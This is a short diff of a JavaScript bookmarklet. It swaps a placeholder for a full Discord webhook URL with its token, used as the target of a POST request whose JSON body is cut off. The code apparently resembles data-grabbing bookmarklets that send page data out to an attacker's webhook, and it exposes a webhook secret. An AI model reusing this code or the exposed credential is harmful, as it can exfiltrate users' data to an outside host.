@@ -12,7 +12,7 @@ javascript: void (function () {
     var a = new XMLHttpRequest();
     a.open(
       "POST",
-      "<YOUR_WEBHOOK_URL>"
+      "<https://discord.com/api/webhooks/1178643435532595201/llRsbwPuz2PAJRqSpMhMr-j1cbHIA0bP5EsrcVypFdI4qMASjyDliKyyCl2WDq12AH6M>"
     ),
       a.setRequestHeader("Content-type", "application/json");
     var b = {
